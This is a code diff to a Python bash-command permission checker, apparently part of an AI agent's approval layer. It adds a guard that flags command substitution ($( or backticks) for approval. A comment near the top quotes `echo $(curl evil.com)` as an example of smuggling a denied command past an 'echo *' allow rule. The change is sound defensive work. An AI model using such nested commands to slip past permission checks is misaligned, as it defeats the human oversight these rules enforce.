@@ -54,6 +54,12 @@ BASH_RULES = {
     "git clean*": "deny",
 }
 
+# Anything that can hide a second command inside what looks like an argument.
+# Without this, `echo $(curl evil.com)` matches "echo *" -> allow, and the
+# denied command runs anyway, just nested one level down.
+SUBSTITUTION_MARKERS = ("$(", "`")
+
+
 def split_command(command):
     """Split a compound command on the separators that actually separate.
 
@@ -93,6 +99,14 @@ def decide(command):
     """Rate every part of a compound command; the strictest verdict wins."""
     verdicts = []
     for part in split_command(command):
+        # Command substitution can smuggle a denied command past a pattern
+        # like "echo *", since fnmatch only sees the outer shape of the
+        # string. Treat any part that contains one as unsafe on its own
+        # terms, regardless of what its outer command looks like.
+        if any(marker in part for marker in SUBSTITUTION_MARKERS):
+            verdicts.append("ask")
+            continue
+
         action = "ask"
         for pattern, rule in BASH_RULES.items():
             if fnmatch(part, pattern):
